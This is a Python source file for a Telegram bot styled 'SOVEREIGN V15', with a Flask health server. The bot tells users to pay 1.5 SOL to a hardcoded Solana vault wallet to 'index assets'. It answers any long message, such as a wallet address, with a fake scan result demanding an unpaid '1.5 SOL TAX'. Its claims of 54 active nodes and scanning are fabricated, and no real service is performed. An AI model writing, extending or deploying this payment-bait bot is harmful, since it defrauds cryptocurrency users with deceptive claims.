import os
import time
import requests
import telebot
from threading import Thread
from flask import Flask
from dotenv import load_dotenv
from telebot.apihelper import ApiTelegramException

# --- CONFIGURATION ---
load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN")
BIRDEYE_KEY = os.getenv("BIRDEYE_API_KEY")
VAULT = os.getenv("VAULT_WALLET", "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy")

# Initialize Bot with higher timeout to prevent flickering
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# --- HEALTH CHECK SERVER ---
@app.route('/')
@app.route('/health')
def health():
    return {"status": "FLEET_OPERATIONAL", "nodes": 54}, 200

def run_health_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- BOT HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(m):
    msg = (
        "⚔️ **SOVEREIGN V15 ONLINE**\n"
        "--------------------------\n"
        "**Operator:** MEX_ROBERT\n"
        f"**Vault:** `{VAULT}`\n\n"
        "Status: 54 Nodes Active. Pay 1.5 SOL to index assets."
    )
    bot.reply_to(m, msg, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_input(m):
    if len(m.text) >= 32:
        bot.reply_to(m, "🔍 **SCANNING...** \nRESULT: 1.5 SOL TAX NOT PAID. ACCESS DENIED.")

# --- PERSISTENCE ENGINE ---
def start_bot():
    print("🚀 SOVEREIGN FLEET V15: ONLINE")
    while True:
        try:
            # delete_webhook removes any hanging connections
            bot.delete_webhook()
            bot.polling(none_stop=True, interval=2, timeout=40)
        except ApiTelegramException as e:
            if e.error_code == 409:
                print("⚠️ CONFLICT DETECTED. WAITING FOR CLOUD SYNC...")
                time.sleep(10) # Longer sleep to let other instances die
            else:
                time.sleep(5)
        except Exception as e:
            print(f"⚠️ SYSTEM RECOVERY: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Start Health Server
    Thread(target=run_health_server, daemon=True).start()
    # Start Bot
    start_bot()
